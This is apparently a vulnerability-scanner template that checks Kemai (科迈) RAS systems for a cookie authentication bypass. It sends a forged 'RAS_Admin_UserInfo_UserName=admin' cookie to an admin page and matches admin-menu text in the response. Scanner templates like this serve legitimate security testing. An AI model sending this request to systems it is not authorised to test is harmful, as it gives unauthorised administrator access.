expression: r0()
id: maike-ras-cookie-bypass
info:
  author: zan8in
  description: "\u79D1\u8FC8 RAS\u7CFB\u7EDF \u5B58\u5728Cookie\u9A8C\u8BC1\u8D8A\u6743\
    \uFF0C\u5F53 RAS_Admin_UserInfo_UserName \u8BBE\u7F6E\u4E3A admin \u65F6\u53EF\
    \u8BBF\u95EE\u540E\u53F0\napp=\"\u79D1\u8FC8-RAS\u7CFB\u7EDF\"\n"
  name: "\u79D1\u8FC8 RAS\u7CFB\u7EDF Cookie\u9A8C\u8BC1\u8D8A\u6743\u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/webapp/%E7%A7%91%E8%BF%88/%E7%A7%91%E8%BF%88%20RAS%E7%B3%BB%E7%BB%9F%20Cookie%E9%AA%8C%E8%AF%81%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E.html
  severity: high
rules:
  r0:
    expression: "response.status == 200 && response.body.bcontains(b'\u9000\u51FA\
      </A>') && response.body.bcontains(b'\u7CFB\u7EDF\u767B\u5F55</A>') && response.body.bcontains(b'\u914D\
      \u7F6E\u7BA1\u7406</A>')"
    request:
      headers:
        Cookie: RAS_Admin_UserInfo_UserName=admin
      method: GET
      path: /Server/CmxUser.php?pgid=UserList
